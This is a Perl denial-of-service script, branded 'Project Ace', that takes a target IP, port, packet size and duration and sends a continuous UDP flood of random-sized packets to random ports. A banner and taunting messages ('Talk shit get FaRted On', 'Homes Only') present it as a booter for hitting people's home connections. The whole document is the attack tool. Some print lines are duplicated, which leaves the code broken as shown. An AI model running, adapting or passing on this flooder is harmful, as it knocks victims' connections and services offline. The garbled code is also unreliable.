#!/usr/bin/perl
 
##
# PERL DoS Script
##
 
use Socket;
use strict;
 
my ($method,$ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
 
print <<EOTEXT;                                                       
                                                      ___Project______|_______Ace__|______________On_|____________________Top_|______________________________|~
▒█▀▀█ █▀▀█ █▀▀█ ░░▀ █▀▀ █▀▀ ▀▀█▀▀ 　 ░█▀▀█ █▀▀ █▀▀    |~| INFO                                 |~| Max Boot Time|~| Instagram|~| YouTube |~|~~GIGS|~|(Methods)|~                   
▒█▄▄█ █▄▄▀ █░░█ ░░█ █▀▀ █░░ ░░█░░ 　 ▒█▄▄█ █░░ █▀▀    |~|This Script Was Made By RebirthRuns   |~| ~~~~~~~~~~~~ |~|  ~~~~~~~ |~| ~~~~~~|~| ~~~~~~ |~| NTP,HOME|~              
▒█░░░ ▀░▀▀ ▀▀▀▀ █▄█ ▀▀▀ ▀▀▀ ░░▀░░ 　 ▒█░▒█ ▀▀▀ ▀▀▀    |~|This Script Is free And Has CopyRights|~| 700 Secs MAX |~|  ptv.kaz |~|Ptv Kaz|~|  1 To 9|~| SYN, UDP|~    
    ~Made By RebirthRuns~  (Home  Use  Only)            ~-------Project---------------Ace----------------On--------------The------------Wrld----------Homes---Only~                                                   
     ~Usage Method,Ip,Port,Byte,Seconds~                                               


EOTEXT
 
 print           "Project Ace Just Dropped Yo Shit $ip
                        With " .
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        ($port ? $port : "random") ." ".($time ? "for $time seconds" : "
Talk shit get FaRted On. ") . "\n";
        print "Stop DoSing with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
$iaddr));}
